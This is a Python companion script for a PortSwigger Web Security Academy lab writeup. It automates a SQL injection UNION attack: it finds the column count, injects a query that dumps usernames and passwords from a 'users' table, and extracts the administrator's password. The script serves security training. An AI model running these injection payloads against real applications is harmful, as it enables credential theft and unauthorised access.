#!/usr/bin/env python3
"""
SQL injection UNION attack, retrieving data from other tables
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 09-union-retrieve-data-from-other-tables.md

What this does:
    Confirms the UNION column count and the two text-bearing columns, then
    selects username and password directly from the known `users` table --
    the schema is given by this lab, so there's no information_schema crawl.

Usage:
    python 09-union-retrieve-data-from-other-tables.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

MAX_COLS = 10


def detect_union_cols(client: httpx.Client, url: str) -> int:
    for n in range(1, MAX_COLS + 1):
        nulls = ",".join(["'a'"] * n)
        r = client.get(f"{url}/filter", params={"category": f"Gifts' UNION SELECT {nulls}-- "})
        if r.status_code == 200 and "error" not in r.text.lower()[:200]:
            return n
    raise RuntimeError("Could not determine column count")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    column_count = detect_union_cols(client, lab_url)
    print(f"[+] Columns: {column_count} (both confirmed text-bearing)")

    payload = "Gifts' UNION SELECT username, password FROM users-- "
    r = client.get(f"{lab_url}/filter", params={"category": payload})

    m = re.search(r'administrator[^a-zA-Z0-9](\S+)', r.text)
    if m:
        print(f"[+] Found administrator's row -- password candidate: {m.group(1)}")
    else:
        print("[*] Dumped users table (search manually if the regex above didn't match):")
        print(r.text[:500])

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- log in with the extracted administrator credentials.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
